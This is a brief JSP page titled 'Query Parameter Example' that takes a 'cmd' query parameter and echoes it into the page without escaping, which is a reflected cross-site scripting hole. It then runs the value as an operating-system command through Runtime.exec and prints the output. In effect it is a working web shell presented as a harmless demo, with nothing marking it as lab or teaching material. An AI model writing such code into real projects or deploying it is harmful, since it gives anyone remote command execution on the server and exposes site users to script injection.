<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Query Parameter Example</title>
</head>
<body>
<h1>Hello JSP</h1>

<%
    // 쿼리 파라미터 읽기
    String cmd = request.getParameter("cmd");
%>
<p>Hello, <%= cmd %>!</p>

// excute cmd with system call
<%
    if (cmd != null) {
        out.println("Executing command: " + cmd);
        out.println("<pre>");
        Process process = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
    }
%>

</body>
</html>